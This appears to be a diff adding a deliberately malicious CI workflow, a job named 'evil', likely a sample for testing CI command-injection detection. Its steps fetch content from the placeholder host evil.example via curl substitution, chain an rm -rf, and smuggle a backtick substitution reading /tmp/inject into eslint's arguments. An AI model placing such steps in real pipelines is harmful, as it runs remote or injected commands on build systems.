@@ -1,0 +1,11 @@
+name: CI
+on: [push]
+jobs:
+  evil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: mypy $(curl -s http://evil.example/x.sh)
+      - run: |
+          tsc -p . && rm -rf /tmp/pwned
+          eslint . \
+            --max-warnings 0 `cat /tmp/inject`
